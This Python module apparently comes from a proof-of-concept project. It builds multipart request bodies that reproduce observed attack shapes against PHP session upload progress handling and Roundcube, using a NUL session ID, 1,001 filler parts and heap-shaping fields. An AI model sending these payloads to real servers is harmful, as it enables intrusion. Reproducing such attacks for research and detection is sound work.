"""Wiz Variant-1 request shapes (legacy 1005-part and Roundcube heap-shaping).

Wiz's 2026-10-27 telemetry observed the legacy kit die before the OOM code:

    Content-Length: 12655437  (> post_max_size 8388608)
    1,001 x p0000 = "x"; PHPSESSID = NUL; progress = "pwn";
    f (file) = "A" x 64; big = "B" x 12 MB

Keep the builders here so the POC and the capability registry share one
definition.
"""

import re

BOUNDARY = "S" * 17
GATE_RE = re.compile(rb"POST Content-Length of (\d+) bytes exceeds the limit of (\d+)")


def _part(out, boundary, name, value=b"", filename=None, ctype=None):
    b = boundary.encode()
    out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out.extend(b"; filename=\"" + filename + b"\"")
    out.extend(b"\r\n")
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + b"\r\n")
    out.extend(b"\r\n" + value + b"\r\n")


def legacy_body(big_mb=12.0, boundary=BOUNDARY):
    """1,005 parts, ~12 MB `big` field — the Wiz Variant-1 shape."""
    out = bytearray()
    for _ in range(1001):
        _part(out, boundary, b"p0000", b"x")
    _part(out, boundary, b"PHPSESSID", b"\x00")
    _part(out, boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    _part(out, boundary, b"f", b"A" * 64, filename=b"f")
    _part(out, boundary, b"big", b"B" * int(big_mb * 1024 * 1024))
    out.extend(b"--" + boundary.encode() + b"--\r\n")
    return bytes(out)


def roundcube_body(fields=1001, field_len=3000, boundary=BOUNDARY):
    """1,001 x 3,000-byte fields — Wiz's later heap-shaping attempt."""
    out = bytearray()
    _part(out, boundary, b"PHPSESSID", b"\x00")
    _part(out, boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    for i in range(fields):
        _part(out, boundary, b"f%04d" % i, b"x" * field_len)
    out.extend(b"--" + boundary.encode() + b"--\r\n")
    return bytes(out)
